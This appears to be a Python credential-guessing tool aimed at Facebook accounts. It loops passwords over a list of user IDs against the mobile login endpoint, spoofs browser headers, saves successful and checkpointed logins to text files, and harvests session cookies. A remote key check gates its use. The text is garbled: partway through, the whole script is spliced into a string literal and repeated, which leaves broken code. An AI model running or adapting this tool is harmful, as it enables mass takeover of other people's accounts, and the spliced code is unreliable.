#!/usr/bin/python3

import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as sarfrazssb

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;31m' # 

H = '\033[1;32m' # 

K = '\x1b[1;97m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

blue= '\33[94m'

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

black="\033[0;30m"

pink="\x1b[95m"

blue="\x1b[94m"

underline='\x1b[4m'

colouroff="\x1b[00m"

logo=""" 

\033[1;91m ##     ##    ###    ##     ##    ###    ########  #### 

\033[1;92m ###   ###   ## ##   ##     ##   ## ##   ##     ##  ##

\033[1;93m #### ####  ##   ##  ##     ##  ##   ##  ##     ##  ##  

\033[1;91m ## ### ## ##     ## ######### ##     ## ##     ##  ##

\033[1;92m ##     ## ######### ##     ## ######### ##     ##  ##

\033[1;93m ##     ## ##     ## ##     ## ##     ## ##     ##  ##  

\033[1;91m ##     ## ##     ## ##     ## ##     ## ########  ####

\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••

     \033[1;92m➣ \033[1;92mDEVOLPER   :            MAHADI HASAN AFRIDI

     \033[1;91m➣ \033[1;91mFACEBOOK   :            MAHADI HASAN AFRIDI

     \033[1;92m➣ \033[1;92mWHATSAPP   :            01794315166

     \033[1;91m➣ \033[1;91mGITHUB     :            MAHADI-143

     \033[1;92m➣ \033[1;92mTOOLS      :            FILE CLONING

\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••

"""

try:

    key1=open("/storage/emulated/0/android8.txt",'r').read()

except IOError:

    kok=open("/storage/emulated/0/android8.txt",'w')

    myid=uuid.uuid4().hex[:12]

    f="COBRA-LINUX"

    key=myid+f

    kok.write(key)

    kok.close()

    print(key)

a=requests.get("https://github.com/NAHID-AFRIDY/Approved-Server/blob/main/22UPDATE/Fkmaha-appru.txt").text

b=str(a)

key1=open("/storage/emulated/0/android8.txt",'r').read()

key2=str(key1)  

if key2 in b:

    pass

    

else:

    os.system("clear")

    print

    print(green+"Your key  : "+key2)

    print(yellow+"\n\t\tContact Admin ")

    os.system('xdg-open https://www.facebook.com/4FR1D1.143')

    exit()

    

os.system("clear")

def hasil(OK,cp):

	if not len(OK) != 0:	    pass

	if len(cp) != 0:

	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mMAHADI_OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mMAHADI_CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;93mPress enter to back Mahadi Menu ")

	    sarfraz()

def sarfraz():

    os.system('clear')

    print(logo)

    ipm = requests.get(url_ip).json()

    todz = ''

    IP = ipm['origin']

    print

    print(red+' [1] START CRACK')

    print(green +' [2] FILE MAKE')

    print(yellow +' [0] EXIT')

    print('')

    _sarfraz___ = input(yellow+' [*] Choose option : ')

    if _sarfraz___ in ('1', '01'):

        __xxx__().sarfrazx(id)

    if _sarfraz___ in ('2', '02'):

    	create_file()

    if _sarfraz___ in ('E', 'ee'):

        pass

class __xxx__:

    def __init__(self):

        self.id = []

    def sarfrazx(self,id):

        os.system("clear")

        print(logo)

        self.cnt = input(yellow+'Put File Name : ')

        self.id = open(self.cnt).read().splitlines()

        os.system('clear')

        print(logo)

        print("")

        ___worldwide___ = ('y')

        if ___worldwide___ in ('yes','Yes','Y', 'y'):

            self.__pler__()

        else:

            print(' [!] Choose Correct One');

            self.sarfrazx(id)

    def __metode__(self, user, __chi__, cebok):

        global ok,cp,loop

        sys.stdout.write(f"\r \x1b[1;93m[MAHADI-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")

        sys.stdout.flush()

        try:

            for pw in __chi__:

                pw = pw.lower()

                session=requests.Session()

                header = {

                    "Host":cebok,

                    "upgrade-insecure-requests":"1",

                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "dnt":"1",

                    "x-requested-with":"mark.via.gp",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://m.facebook.com/",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)

                das = {

                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),

                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),

                    "uid":user,

                    "flow":"login_no_pin",

                    "pass":pw,

                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"

                }

                header1 = {

                    "Host":cebok,

                    "cache-control":"max-age=0",

                    "upgrade-insecure-requests":"1",

                    "origin":"https://"+cebok,

                    "content-type":"application/x-www-form-urlencoded",

                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "x-requested-with":"XMLHttpRequest",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)

                if 'c_user' in session.cookies.get_dict():

                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                    print(f"\r{H} [MAHADI-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('MAHADI_OK.txt' , 'a').write('%s\n' % wrt)

                    self.follow(session,coki)

                    break

                elif 'checkpoint' in session.cookies.get_dict():

                    try:

                        tokenz = open('.token.txt').read()

                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']

                        month, day, year = cp_ttl.split('/')

                        month = bulan_ttl[month]

                        print('\r%s [MAHADI-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('MAHADI_CP.txt' , 'a').write('%#!/usr/bin/python3

import os

try:

    import requests

except ImportError:

    print('\n [✓] installing requests !...\n')

    os.system('pip install requests')

try:

    import concurrent.futures

except ImportError:

    print('\n [✓] installing futures !...\n')

    os.system('pip install futures')

try:

    import bs4

except ImportError:

    print('\n [✓] installing bs4 !...\n')

    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib

from concurrent.futures import ThreadPoolExecutor as sarfrazssb

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

    if n < 0 or n > 12:

        exit()

    nTemp = n - 1

except ValueError:

    exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

P = '\x1b[1;97m' # 

M = '\033[1;31m' # 

H = '\033[1;32m' # 

K = '\x1b[1;97m' # 

B = '\x1b[1;97m' # 

U = '\x1b[1;97m' # 

O = '\x1b[1;97m' # 

N = '\x1b[0m'    # 

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,fuck,pwBaru=[],[],[]

ok = []

cp = []

id = []

user = []

loop = 0

url_lookup = "https://lookup-id.com/"

url_mb = "https://m.facebook.com"

url_ip = "https://www.httpbin.org/ip"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}

done = False

def jalan(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.01)

blue= '\33[94m'

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

black="\033[0;30m"

pink="\x1b[95m"

blue="\x1b[94m"

underline='\x1b[4m'

colouroff="\x1b[00m"

logo=""" 

\033[1;91m ##     ##    ###    ##     ##    ###    ########  #### 

\033[1;92m ###   ###   ## ##   ##     ##   ## ##   ##     ##  ##

\033[1;93m #### ####  ##   ##  ##     ##  ##   ##  ##     ##  ##  

\033[1;91m ## ### ## ##     ## ######### ##     ## ##     ##  ##

\033[1;92m ##     ## ######### ##     ## ######### ##     ##  ##

\033[1;93m ##     ## ##     ## ##     ## ##     ## ##     ##  ##  

\033[1;91m ##     ## ##     ## ##     ## ##     ## ########  ####

\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••

     \033[1;92m➣ \033[1;92mDEVOLPER   :            MAHADI HASAN AFRIDI

     \033[1;91m➣ \033[1;91mFACEBOOK   :            MAHADI HASAN AFRIDI

     \033[1;92m➣ \033[1;92mWHATSAPP   :            01794315166

     \033[1;91m➣ \033[1;91mGITHUB     :            MAHADI-143

     \033[1;92m➣ \033[1;92mTOOLS      :            FILE CLONING

\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••

"""

try:

    key1=open("/storage/emulated/0/android8.txt",'r').read()

except IOError:

    kok=open("/storage/emulated/0/android8.txt",'w')

    myid=uuid.uuid4().hex[:12]

    f="COBRA-LINUX"

    key=myid+f

    kok.write(key)

    kok.close()

    print(key)

a=requests.get("https://github.com/NAHID-AFRIDY/Approved-Server/blob/main/22UPDATE/Fkmaha-appru.txt").text

b=str(a)

key1=open("/storage/emulated/0/android8.txt",'r').read()

key2=str(key1)  

if key2 in b:

    pass

    

else:

    os.system("clear")

    print

    print(green+"Your key  : "+key2)

    print(yellow+"\n\t\tContact Admin ")

    os.system('xdg-open https://www.facebook.com/4FR1D1.143')

    exit()

    

os.system("clear")

def hasil(OK,cp):

	if not len(OK) != 0:

	    pass

	if len(cp) != 0:

	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mMAHADI_OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mMAHADI_CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;93mPress enter to back Mahadi Menu ")

	    sarfraz()

def sarfraz():

    os.system('clear')

    print(logo)

    ipm = requests.get(url_ip).json()

    todz = ''

    IP = ipm['origin']

    print

    print(red+' [1] START CRACK')

    print(green +' [2] FILE MAKE')

    print(yellow +' [0] EXIT')

    print('')

    _sarfraz___ = input(yellow+' [*] Choose option : ')

    if _sarfraz___ in ('1', '01'):

        __xxx__().sarfrazx(id)

    if _sarfraz___ in ('2', '02'):

    	create_file()

    if _sarfraz___ in ('E', 'ee'):

        pass

class __xxx__:

    def __init__(self):

        self.id = []

    def sarfrazx(self,id):

        os.system("clear")

        print(logo)

        self.cnt = input(yellow+'Put File Name : ')

        self.id = open(self.cnt).read().splitlines()

        os.system('clear')

        print(logo)

        print("")

        ___worldwide___ = ('y')

        if ___worldwide___ in ('yes','Yes','Y', 'y'):

            self.__pler__()

        else:

            print(' [!] Choose Correct One');

            self.sarfrazx(id)

    def __metode__(self, user, __chi__, cebok):

        global ok,cp,loop

        sys.stdout.write(f"\r \x1b[1;93m[MAHADI-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")

        sys.stdout.flush()

        try:

            for pw in __chi__:

                pw = pw.lower()

                session=requests.Session()

                header = {

                    "Host":cebok,

                    "upgrade-insecure-requests":"1",

                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "dnt":"1",

                    "x-requested-with":"mark.via.gp",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://m.facebook.com/",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)

                das = {

                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),

                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),

                    "uid":user,

                    "flow":"login_no_pin",

                    "pass":pw,

                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"

                }

                header1 = {

                    "Host":cebok,

                    "cache-control":"max-age=0",

                    "upgrade-insecure-requests":"1",

                    "origin":"https://"+cebok,

                    "content-type":"application/x-www-form-urlencoded",

                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",

                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

                    "x-requested-with":"XMLHttpRequest",

                    "sec-fetch-site":"same-origin",

                    "sec-fetch-mode":"cors",

                    "sec-fetch-user":"empty",

                    "sec-fetch-dest":"document",

                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",

                    "accept-encoding":"gzip, deflate br",

                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"

                }

                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)

                if 'c_user' in session.cookies.get_dict():

                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                    print(f"\r{H} [MAHADI-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('MAHADI_OK.txt' , 'a').write('%s\n' % wrt)

                    self.follow(session,coki)

                    break

                elif 'checkpoint' in session.cookies.get_dict():

                    try:

                        tokenz = open('.token.txt').read()

                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']

                        month, day, year = cp_ttl.split('/')

                        month = bulan_ttl[month]

                        print('\r%s [MAHADI-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('MAHADI_CP.txt' , 'a').write('%s\n' % wrt)

                        break

                    except (KeyError, IOError):

                        month = ''

                        day   = ''

                        year  = ''

                    except:

                        pass

                    print('\r%s [MAHADI-CP] %s | %s ' % (M, user, pw))\n' % wrt)

                        break

                    except (KeyError, IOError):

                        month = ''

                        day   = ''

                        year  = ''

                    except:

                        pass

                    print('\r%s [MAHADI-CP] %s | %s ' % (M, user, pw))
